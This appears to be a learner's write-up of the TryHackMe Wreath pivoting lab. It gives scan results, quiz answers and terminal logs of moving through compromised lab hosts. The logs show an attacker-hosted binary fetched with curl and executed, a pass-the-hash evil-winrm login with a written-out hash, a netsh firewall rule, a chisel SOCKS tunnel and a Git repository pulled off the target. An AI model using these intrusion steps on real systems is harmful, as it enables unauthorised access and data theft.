@@ -1023,3 +1023,1029 @@ PORT      STATE SERVICE  REASON  VERSION
 |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
 
 NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.59 seconds
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tac /etc/hosts           
+10.200.84.200 thomaswreath.thm
+
+https://www.rapid7.com/db/vulnerabilities/http-webmin-cve-2019-15107/
+```
+How many of the first 15000 ports are open on the target?
+nmap -p-15000 -vv TARGET_IP -oG initial-scan
+*4*
+Perform a service scan on these open ports.
+What OS does Nmap think is running?
+This will be given by the webserver. Note that Nmap is unlikely to get a valid result with -O, so use the headers from the webserver to ascertain the OS.
+*centos*
+Okay, we know what we're dealing with.
+Open the IP in your browser -- what site does the server try to redirect you to?
+*http://thomaswreath.thm*
+You will have noticed that the site failed to resolve. Looks like Thomas forgot to set up the DNS!
+Add it to your hosts file manually. This can be accomplished by editing the `/etc/hosts` file on Linux/MacOS, or `C:\Windows\System32\drivers\etc\hosts` on Windows, to include the IP address, followed by a tab, then the domain name. **Note:** this _must_ be done as root/Administrator.
+It should look something like this when done, although the _IP address and domain name will be different_:
+Make sure you don't include the https://. It should just be domainname.thm
+`10.10.10.10 example.thm`
+Reload the webpage -- it should now resolve, but it will give you a different error related to the TLS certificate. This occurs because the box is not really connected to the internet and so cannot have a signed TLS certificate. In this instance it is safe to click "Advanced" -> "Accept Risk"; however, you should never do this in the real world.
+In real life we would perform a "footprinting" phase of the engagement at this point. This essentially involves finding as much public information about the target as possible and noting it down. You never know what could prove useful!
+Read through the text on the page. What is Thomas' mobile phone number?
+Look at the bottom of the page.
+![[Pasted image 20230603140607.png]]
+*+447821548812*
+Let's have a look at the highest open port.
+Look back at your service scan results: what server version does Nmap detect as running here?
+*MiniServ 1.890 (Webmin httpd)*
+Put your answer to the last question into Google.
+It appears that this service is vulnerable to an unauthenticated remote code execution exploit!
+What is the CVE number for this exploit?
+CVE-XXXX-XXXXX
+*CVE-2019-15107*
+We have everything we need to break into this machine, so let's get going!
+Question Done
+[**Video**](https://youtu.be/lmMqlt5R38Y)
+As always, enumeration is the key to success. Information is power -- the more we know about our target, the more options we have available to us. As such, our first step when attempting to pivot through a network is to get an idea of what's around us.
+There are five possible ways to enumerate a network through a compromised host:
+Address Resolution Protocol (ARP) is responsible for finding the MAC (hardware) address related to a specific IP address. It works by broadcasting an ARP query, "Who has this IP address? Tell me." And the response is of the form, "The IP address is at this MAC address."
+1. Using material found on the machine. The hosts file or ARP cache, for example
+2. Using pre-installed tools
+3. Using statically compiled tools
+4. Using scripting techniques
+5. Using local tools through a proxy
+These are written in the order of preference. Using local tools through a proxy is incredibly slow, so should only be used as a last resort. Ideally we want to take advantage of pre-installed tools on the system (Linux systems sometimes have Nmap installed by default, for example). This is an example of Living off the Land (LotL) -- a good way to minimise risk. Failing that, it's very easy to transfer a static binary, or put together a simple ping-sweep tool in Bash (which we'll cover below).
+![222](https://assets.tryhackme.com/additional/wreath-network/NWRkOTMzODNi.jpg)Before anything else though, it's sensible to check to see if there are any pieces of useful information stored on the target. `arp -a` can be used to Windows or Linux to check the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in `/etc/hosts` on Linux, or `C:\Windows\System32\drivers\etc\hosts` on Windows. `/etc/resolv.conf` on Linux may also identify any local DNS servers, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an interface is with `ipconfig /all`. Linux has an equivalent command as an alternative to reading the resolv.conf file: `nmcli dev show`.
+"nmcli dev show" is a command used in the Linux operating system to display information about network devices. It provides details such as the device name, type (e.g., Ethernet or Wi-Fi), state (e.g., connected or disconnected), and the current connection status.
+If there are no useful tools already installed on the system, and the rudimentary scripts are not working, then it's possible to get _static_ copies of many tools. These are versions of the tool that have been compiled in such a way as to not require any dependencies from the box. In other words, they could theoretically work on _any_ target, assuming the correct OS and architecture. For example: statically compiled copies of Nmap for different operating systems (along with various other tools) can be found in various places on the internet. A good (if dated) resource for these can be found [here](https://github.com/andrew-d/static-binaries). A more up-to-date (at the time of writing) version of Nmap for Linux specifically can be found [here](https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip). Be aware that many repositories of static tools are very outdated. Tools from these repositories will likely still do the job; however, you may find that they require different syntax, or don't work in quite the way that you've come to expect.
+_**Note:** The difference between a "static" binary and a "dynamic" binary is in the compilation. Most programs use a variety of external libraries (_`.so` _files on Linux, or_ `.dll` _files on Windows) -- these are referred to as "dynamic" programs. Static programs are compiled with these libraries built into the finished executable file. When we're trying to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed meaning that a dynamic binary would be unable to run._
+User Datagram Protocol (UDP) is a connectionless protocol; UDP does not require a connection to be established. UDP is suitable for protocols that rely on fast queries, such as DNS, and for protocols that prioritise real-time communications, such as audio/video conferencing and broadcast.
+Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is _very_ slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy _specifically against the found ports_.
+---
+Before putting this all into practice let's talk about living off the land shell techniques. Ideally a tool like Nmap will already be installed on the target; however, this is not always the case (indeed, you'll find that Nmap is **not** installed on the currently compromised server of the Wreath network). If this happens, it's worth looking into whether you can use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x network:
+`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`
+This could be easily modified to search other network ranges -- including the Wreath network.
+The above command generates a full list of numbers from 1 to 255 and loops through it. For each number, it sends one ICMP ping packet to ![222](https://assets.tryhackme.com/additional/wreath-network/NzA0MWYzMzQ1.jpg)192.168.1.x as a backgrounded job (meaning that each ping runs in parallel for speed), where i is the current number. Each response is searched for "bytes from" to see if the ping was successful. Only successful responses are shown.
+The equivalent of this command in Powershell is unbearably slow, so it's better to find an alternative option where possible. It's relatively straight forward to write a simple network scanner in a language like C# (or a statically compiled scanner written in C/C++/Rust/etc), which can be compiled and used on the target. This, however, is outwith the scope of the Wreath network (although very simple beta examples can be found [here](https://github.com/MuirlandOracle/C-Sharp-Port-Scan) for C#, or [here](https://github.com/MuirlandOracle/CPP-Port-Scanner) for C++).
+It's worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows boxes frequently do this, for example). This is likely to be less of a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network should be safe. It's worth keeping in mind, however.
+If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.
+Port scanning in bash can be done (ideally) entirely natively:
+`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`
+Bear in mind that this will take a _very_ long time, however!
+There are many other ways to perform enumeration using only the tools available on a system, so please experiment further and see what you can come up with!
+Answer the questions below
+```text
+[root@prod-serv ~]# arp -a
+ip-10-200-84-1.eu-west-1.compute.internal (10.200.84.1) at 02:f3:70:5f:3a:e7 [ether] on eth0
+[root@prod-serv ~]# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
+    link/ether 02:2b:ea:32:5d:cb brd ff:ff:ff:ff:ff:ff
+    inet 10.200.84.200/24 brd 10.200.84.255 scope global dynamic noprefixroute eth0
+       valid_lft 2958sec preferred_lft 2958sec
+    inet6 fe80::2b:eaff:fe32:5dcb/64 scope link 
+       valid_lft forever preferred_lft forever
+[root@prod-serv ~]# cat /etc/hosts
+127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
+::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
+[root@prod-serv ~]# cat /etc/resolv.conf
+```
+```text
+# Generated by NetworkManager
+search eu-west-1.compute.internal
+nameserver 10.200.0.2
+
+[root@prod-serv ~]# nmcli dev show
+GENERAL.DEVICE:                         eth0
+GENERAL.TYPE:                           ethernet
+GENERAL.HWADDR:                         02:2B:EA:32:5D:CB
+GENERAL.MTU:                            9001
+GENERAL.STATE:                          100 (connected)
+GENERAL.CONNECTION:                     eth0
+GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveConnection/1
+WIRED-PROPERTIES.CARRIER:               on
+IP4.ADDRESS[1]:                         10.200.84.200/24
+IP4.GATEWAY:                            10.200.84.1
+IP4.ROUTE[1]:                           dst = 0.0.0.0/0, nh = 10.200.84.1, mt = 100
+IP4.ROUTE[2]:                           dst = 10.200.84.0/24, nh = 0.0.0.0, mt = 100
+IP4.DNS[1]:                             10.200.0.2
+IP4.DOMAIN[1]:                          eu-west-1.compute.internal
+IP6.ADDRESS[1]:                         fe80::2b:eaff:fe32:5dcb/64
+IP6.GATEWAY:                            --
+IP6.ROUTE[1]:                           dst = ff00::/8, nh = ::, mt = 256, table=255
+IP6.ROUTE[2]:                           dst = fe80::/64, nh = ::, mt = 256
+
+GENERAL.DEVICE:                         lo
+GENERAL.TYPE:                           loopback
+GENERAL.HWADDR:                         00:00:00:00:00:00
+GENERAL.MTU:                            65536
+GENERAL.STATE:                          10 (unmanaged)
+GENERAL.CONNECTION:                     --
+GENERAL.CON-PATH:                       --
+IP4.ADDRESS[1]:                         127.0.0.1/8
+IP4.GATEWAY:                            --
+IP6.ADDRESS[1]:                         ::1/128
+IP6.GATEWAY:                            --
+IP6.ROUTE[1]:                           dst = ::1/128, nh = ::, mt = 256
+```
+What is the absolute path to the file containing DNS entries on Linux?
+*/etc/resolv.conf*
+What is the absolute path to the hosts file on Windows?
+*C:\Windows\System32\drivers\etc\hosts*
+How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
+*for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done*
+```text
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ cp /home/witty/Downloads/nmap . 
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.200.81.200 - - [10/Jun/2023 23:39:03] "GET /nmap HTTP/1.1" 200 -
+
+[root@prod-serv tmp]# curl http://10.50.82.74:1234/nmap -o nmap_witty
+
+[root@prod-serv tmp]# chmod +x nmap_witty
+[root@prod-serv tmp]# ./nmap_witty -sn 10.200.81.1-255 -oN scan-witty
+
+Starting Nmap 6.49BETA1 ( http://nmap.org )
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for ip-10-200-81-1.eu-west-1.compute.internal (10.200.81.1)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00046s latency).
+MAC Address: 02:8C:E0:55:7B:89 (Unknown)
+Nmap scan report for ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
+Host is up (0.00034s latency).
+MAC Address: 02:84:A5:B5:7D:3F (Unknown)
+Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
+Host is up (0.00086s latency).
+MAC Address: 02:D2:B6:29:6A:7B (Unknown)
+Nmap scan report for ip-10-200-81-250.eu-west-1.compute.internal (10.200.81.250)
+Host is up (0.00037s latency).
+MAC Address: 02:E7:4E:C8:80:A7 (Unknown)
+Nmap scan report for ip-10-200-81-200.eu-west-1.compute.internal (10.200.81.200)
+Host is up.
+Nmap done: 255 IP addresses (5 hosts up) scanned in 3.53 seconds
+
+10.200.81.100 and 10.200.81.150
+
+[root@prod-serv witty]# ./nmap_witty 10.200.81.100
+
+Starting Nmap 6.49BETA1 ( http://nmap.org )
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Verbosity Increased to 1.
+Verbosity Increased to 2.
+Verbosity Increased to 3.
+SYN Stealth Scan Timing: About 24.43% done; ETC: 17:32 (0:01:36 remaining)
+SYN Stealth Scan Timing: About 48.72% done; ETC: 17:32 (0:01:04 remaining)
+SYN Stealth Scan Timing: About 73.03% done; ETC: 17:32 (0:00:34 remaining)
+Completed SYN Stealth Scan (6150 total ports)
+Nmap scan report for ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (-0.20s latency).
+All 6150 scanned ports on ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100) are filtered
+MAC Address: 02:72:76:09:C7:27 (Unknown)
+
+Read data files from: /etc
+Nmap done: 1 IP address (1 host up) scanned in 124.51 seconds
+           Raw packets sent: 12302 (541.256KB) | Rcvd: 1 (28B)
+
+[root@prod-serv witty]# ./nmap_witty 10.200.81.150
+
+Starting Nmap 6.49BETA1 ( http://nmap.org )
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Verbosity Increased to 1.
+Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 0.96% done
+Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 3.11% done; ETC: 17:37 (0:03:07 remaining)
+Verbosity Increased to 2.
+Verbosity Increased to 3.
+Discovered open port 5985/tcp on 10.200.81.150
+Increasing send delay for 10.200.81.150 from 0 to 5 due to 11 out of 35 dropped probes since last increase.
+SYN Stealth Scan Timing: About 52.67% done; ETC: 17:35 (0:00:32 remaining)
+Completed SYN Stealth Scan (6150 total ports)
+Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00067s latency).
+Not shown: 6147 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+MAC Address: 02:16:7D:59:0A:8F (Unknown)
+
+Read data files from: /etc
+Nmap done: 1 IP address (1 host up) scanned in 90.84 seconds
+           Raw packets sent: 18517 (814.716KB) | Rcvd: 75 (3.284KB)
+```
+Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?
+The network diagram at the top of the screen is a give-away here.
+*2*
+In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
+Don't put a space between the two numbers.
+*100,150*
+Scan the hosts -- which one does _not_ return a status of "filtered" for every port (submit the last octet only)?
+*150*
+Let's assume that the other host is inaccessible from our current position in the network.
+Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
+Scan the first 15000 ports. In some instances port 5357 will also show as being open. If this is the case, please disregard it and use the other three.
+*80,3389,5985*
+We cannot currently perform a service detection scan on the target without first setting up a proxy, so for the time being, let's assume that the services Nmap has identified based on their port number are accurate. (Please feel free to experiment with other scan types through a proxy after completing the pivoting section).
+Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
+Service name, not the port number.
+*http*
+Now that we have an idea about the other hosts on the network, we can start looking at some of the tools and techniques we could use to access them!
+Question Done
+[**Video**](https://youtu.be/6wtuTnStdZk)
+We will soon be moving on to the final teaching point of this network: Anti-virus evasion techniques.
+Before we can do that, however, we first need to scope out the final target!
+We know from the briefing that this target is likely to be the other Windows machine on the network. By process of elimination we can tell that this is Thomas' PC which he told us has antivirus software installed. If we're very lucky it will be out of date though!
+As always, we need to enumerate the target before we can do anything else, but how can we do this from a compromised Windows host? As mentioned way back in the Pivoting Enumeration task, Nmap won't work on Windows unless it's been properly installed on the target. Scanning through one proxy is bad, but at this point we'd be scanning through _two_ proxies, which would be unbearable. We could write a tool to do it for us, but let's leave that for the time being (there will be more than enough coding in the upcoming section as it is!). Instead, let's look closer to home and ask one burning question:
+**How do Empire Modules work?**
+For the most part Empire modules are quite literally just scripts (usually in PowerShell) that are executed by the framework through an active agent.  In other words, these are just PowerShell scripts, and we have PowerShell access to the target.
+For the sake of learning, let's upload the Empire Port Scanning script and execute it manually on the target.
+---
+In our current situation (on an isolated target, communicating through a jumpserver), under normal circumstances uploading tools manually would usually be something of a chore -- think relays and webservers. Fortunately evil-winrm gives us several easy options for transferring and including tools.
+**Upload/Download:**
+The first option available to us is the in-built Upload/Download feature built into the tool. From within evil-winrm we can use `upload LOCAL_FILEPATH REMOTE_FILEPATH` to upload files to the target. Conversely, we can use `download REMOTE_FILEPATH LOCAL_FILEPATH` to download files back from the target. These could come in handy if we, say, wanted to upload a tool to the target, save the results from running it to a log file, then download the log file back to our attacking machine for storage. In both instances if we miss out the destination filepath (e.g. the remote filepath on upload, or the local filepath on download), the tool will be uploaded into our current working directory.
+For example:
+![Demonstrating a file upload in Evil-WinRM using nc.exe as an example](https://assets.tryhackme.com/additional/wreath-network/e02003103ad1.png)
+In this example we upload an example tool (`nc.exe`) to `C:\Windows\Temp`, we then create a new file (`demo.txt`) and download it to the current working directory. Note that in the real world using the `C:\Windows\Temp` directory is often a bad idea as it's flagged as a common location for hackers to upload tools. In this case we are using it to keep the box neat and tidy for other users.
+**Local Scripts:**
+Uploading tools is all well and good, but if the tool happens to be a PowerShell script then there is another (even more convenient) method. If you check the help menu for evil-winrm, you will see an interesting `-s` option. This allows us to specify a local directory containing PowerShell scripts -- these scripts will be made accessible for us to import directly into memory using our evil-winrm session (meaning they don't need to touch the disk at all). For example, if we happened to have our scripts located at `/opt/scripts`, we could include them in the connection with:
+`evil-winrm -u USERNAME  -p PASSWORD -i IP -s /opt/scripts`
+Let's use this option to include the Empire Portscan module.
+The Empire scripts are stored at `/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/` if you installed using apt as recommended. A copy of this tool is also included in the zipfile attached to Task 1, or can be downloaded [here](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1), if you can't find it locally.
+Regardless, we can now sign in as the Administrator using the password hash discovered previously, including the Empire network scanning scripts:
+`evil-winrm -u Administrator -H HASH -i IP -s EMPIRE_DIR`
+Type `Invoke-Portscan.ps1` and press enter to initialise the script.
+Now if we type `Get-Help Invoke-Portscan` we should see the help menu for the tool without having to import or upload anything manually!![Demonstrating the Get-Help cmdlet for the imported function](https://assets.tryhackme.com/additional/wreath-network/67448956442a.png)
+---
+The Empire Portscan module is designed to be similar to Nmap in terms of syntax. You are encouraged to read through the full help menu for the tool; however, we only need two switches: `-Hosts` and `-TopPorts`. We _could_ use the `-Ports` switch and just scan a range of ports, but for the sake of speed we can use the -TopPorts switch to scan a user-specified number of the most commonly open ports. For example, `-TopPorts 50` would scan the 50 most commonly open ports.
+The full command would then look like this (using the top 50 ports and our example of 172.16.0.10):
+`Invoke-Portscan -Hosts 172.16.0.10 -TopPorts 50`
+Answer the questions below
+```text
+*Evil-WinRM* PS C:\Users\Administrator\Documents> echo "hi" > test.txt
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+
+    Directory: C:\Users\Administrator\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/16/2023  12:31 AM             10 test.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> download test.txt
+Info: Downloading test.txt to ./test.txt
+
+                                                             
+Info: Download successful!
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ cat test.txt     
+��hi
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.81.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Windows\Temp
+
+*Evil-WinRM* PS C:\Windows\Temp> Invoke-Portscan.ps1
+*Evil-WinRM* PS C:\Windows\Temp> Get-Help Invoke-Portscan
+
+NAME
+    Invoke-Portscan
+
+SYNOPSIS
+    Simple portscan module
+
+    PowerSploit Function: Invoke-Portscan
+    Author: Rich Lundeen (http://webstersProdigy.net)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+SYNTAX
+    Invoke-Portscan -Hosts <String[]> [-ExcludeHosts <String>] [-Ports <String>] [-PortFile <String>] [-TopPorts <String>] [-ExcludedPorts <String>] [-Open] [-SkipDiscovery] [-PingOnly] [-DiscoveryPorts <String>] [-Threads <Int32>] [-nHosts
+    <Int32>] [-Timeout <Int32>] [-SleepTimer <Int32>] [-SyncFreq <Int32>] [-T <Int32>] [-GrepOut <String>] [-XmlOut <String>] [-ReadableOut <String>] [-AllformatsOut <String>] [-noProgressMeter] [-quiet] [-ForceOverwrite] [<CommonParameters>]
+
+    Invoke-Portscan -HostFile <String> [-ExcludeHosts <String>] [-Ports <String>] [-PortFile <String>] [-TopPorts <String>] [-ExcludedPorts <String>] [-Open] [-SkipDiscovery] [-PingOnly] [-DiscoveryPorts <String>] [-Threads <Int32>] [-nHosts
+    <Int32>] [-Timeout <Int32>] [-SleepTimer <Int32>] [-SyncFreq <Int32>] [-T <Int32>] [-GrepOut <String>] [-XmlOut <String>] [-ReadableOut <String>] [-AllformatsOut <String>] [-noProgressMeter] [-quiet] [-ForceOverwrite] [<CommonParameters>]
+
+DESCRIPTION
+    Does a simple port scan using regular sockets, based (pretty) loosely on nmap
+
+RELATED LINKS
+    http://webstersprodigy.net
+
+REMARKS
+    To see the examples, type: "get-help Invoke-Portscan -examples".
+    For more information, type: "get-help Invoke-Portscan -detailed".
+    For technical information, type: "get-help Invoke-Portscan -full".
+    For online help, type: "get-help Invoke-Portscan -online"
+
+*Evil-WinRM* PS C:\Windows\Temp> Invoke-Portscan -Hosts 10.200.81.150 -TopPorts 50
+
+Hostname      : 10.200.81.150
+alive         : True
+openPorts     : {80, 3389, 445, 139...}
+closedPorts   : {443, 23, 21, 110...}
+filteredPorts : {}
+finishTime    : 6/16/2023 12:41:03 AM
+```
+Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?
+*80,3389*
+### Task 34  Personal PC Pivoting
+[**Video**](https://youtu.be/VQLeS1uIrVk)
+We found two ports open in the previous task. RDP won't be of much use to us without credentials (or at least a hash, although Pass-the-Hash attacks are often restricted through RDP anyway); however, the webserver is worth looking into. Wreath told us that he worked on his website using a local environment on his own PC, so this bleeding-edge version may contain some vulnerabilities that we could use to exploit the target. Before we can do that, however, we must figure out how to access the development webserver on Wreath's PC from our attacking machine.
+We have two immediate options for this: Chisel, and Plink.
+Answer the questions below
+```text
+*Evil-WinRM* PS C:\Windows\Temp> netsh advfirewall firewall add rule name="Chisel-witty" dir=in action=allow protocol=tcp localport=44444
+Ok.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ gzip -d chisel_1.8.1_windows_amd64.gz
+
+*Evil-WinRM* PS C:\Windows\Temp> upload /home/witty/Downloads/chisel_1.8.1_windows_amd64 C:\Windows\temp\chisel.exe
+Info: Uploading /home/witty/Downloads/chisel_1.8.1_windows_amd64 to C:\Windows\temp\chisel.exe
+
+                                                             
+Data: 11569152 bytes of 11569152 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Windows\Temp> .\chisel.exe server -p 44444 --socks5
+chisel.exe : 2023/06/16 01:08:42 server: Fingerprint 6Q5PeRGLbnQ+gby2WQW47S8/lLvG4034EWDnQme9ZMU=
+    + CategoryInfo          : NotSpecified: ( 01:0...034EWDnQme9ZMU=:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ server: Listening on http://0.0.0.0:444442023/06/16 01:09:52 server: session#1: Client version (0.0.0-src) differs from server version (1.8.1)
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ chisel client 10.200.81.150:44444 44444:socks
+ client: Connecting to ws://10.200.81.150:44444
+ client: tun: proxy#127.0.0.1:44444=>socks: Listening
+ client: Connected (Latency 240.872869ms)
+
+Using foxyproxy to configure chisel then go to http://10.200.81.100/ then using wappalizer to get programming language
+```
+If you followed the recommended route of using sshuttle to pivot from the webserver then a _chisel forward proxy_ is recommended here as it will be relatively easy to connect to through the sshuttle connection without requiring a relay -- look back at the Chisel task if you need help with this!
+When using this option you will need to open up a port in the Windows firewall to allow the forward connection to be made. The syntax for opening a port using `netsh` looks something like this:
+`netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT`
+Please use the `name-USERNAME` naming convention -- for example:
+`netsh advfirewall firewall add rule name="Chisel-MuirlandOracle" dir=in action=allow protocol=tcp localport=47000`
+![Demonstration of the above firewall rule through WinRM](https://assets.tryhackme.com/additional/wreath-network/31589c0e89b3.png)
+Whether you choose the recommended option or not, get a pivot up and running!
+If using chisel, run the chisel server on the Gitserver and the chisel client on your attacking machine.
+![[Pasted image 20230615191654.png]]
+![[Pasted image 20230615191854.png]]
+Completed
+Access the website in your web browser (using FoxyProxy if you used the recommended forward proxy, or directly if you used a port forward).
+Using the Wappalyzer browser extension ([Firefox](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) | [Chrome](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en)) or an alternative method, identify the server-side Programming language (including the version number) used on the website.
+*PHP 7.4.11*
+### Task 35  Personal PC The Wonders of Git
+[**Video**](https://youtu.be/_uH2A5FExyI)
+It seems we guessed right! It appears to be a carbon copy of the website running on the webserver. If there are any differences here then they are clearly not going to be immediately visible, which means we may need to look at fuzzing this site through two proxies...
+Before we start messing around with fuzzing tools though, let's take a step back and think about this.
+We know from the brief that Thomas has been using git server to version control his projects -- just because the version on the webserver isn't up to date, doesn't mean that he hasn't been committing to the repo more regularly! In other words, rather than fuzzing the server, we might be able to just download the source code for the site and review it locally.
+Ideally we could just clone the repo directly from the server. This would likely require credentials, which we would need to find. Alternatively, given we already have local admin access to the git server, we could just download the repository from the hard disk and re-assemble it locally which does not require any (further) authentication.
+For the sake of practice, let's use this latter option.
+Answer the questions below
+```text
+*Evil-WinRM* PS C:\Users\Thomas> cd C:\
+*Evil-WinRM* PS C:\> ls
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        11/8/2020   1:28 PM                GitStack
+d-----       12/19/2020   5:37 PM                PerfLogs
+d-r---         1/3/2021   2:35 PM                Program Files
+d-----       12/20/2020   3:56 PM                Program Files (x86)
+d-r---        6/13/2023   1:29 AM                Users
+d-----        1/13/2021   1:05 PM                Windows
+
+*Evil-WinRM* PS C:\> cd GitStack
+*Evil-WinRM* PS C:\GitStack> ls
+
+    Directory: C:\GitStack
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        11/8/2020   1:28 PM                apache
+d-----        11/8/2020   1:28 PM                app
+d-----        6/13/2023  12:48 AM                data
+d-----        11/8/2020   1:28 PM                git
+d-----        6/13/2023  12:49 AM                gitphp
+d-----        11/8/2020   1:28 PM                php
+d-----        11/8/2020   1:28 PM                python
+d-----        11/8/2020   2:35 PM                repositories
+d-----        11/8/2020   1:28 PM                templates
+-a----        11/8/2020   1:28 PM          66800 uninstall.exe
+
+*Evil-WinRM* PS C:\GitStack> cd repositories
+*Evil-WinRM* PS C:\GitStack\repositories> ls
+
+    Directory: C:\GitStack\repositories
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/2/2021   7:05 PM                Website.git
+
+*Evil-WinRM* PS C:\GitStack\repositories> pwd
+
+Path
+----
+C:\GitStack\repositories
+
+*Evil-WinRM* PS C:\GitStack\repositories> download c:\Gitstack\repositories\Website.git /home/witty/Downloads/CVE-2019-15107/Website.git
+Info: Downloading c:\Gitstack\repositories\Website.git to /home/witty/Downloads/CVE-2019-15107/Website.git
+
+                                                             
+Info: Download successful!
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107/Website.git/c:\Gitstack\repositories\Website.git]
+└─$ ls
+config  description  HEAD  hooks  info  objects  refs
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107/Website.git]
+└─$ mv 'c:\Gitstack\repositories\Website.git' .git
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107/Website.git]
+└─$ /home/witty/bug_hunter/GitTools/Extractor/extractor.sh . Website
+###########
+```
+```text
+# Extractor is part of https://github.com/internetwache/GitTools
+#
+```
+```text
+# Developed and maintained by @gehaxelt from @internetwache
+#
+```
+```text
+# Use at your own risk. Usage might be illegal in certain circumstances.
+```
+```text
+# Only for educational purposes!
+###########
+[*] Destination folder does not exist
+[*] Creating...
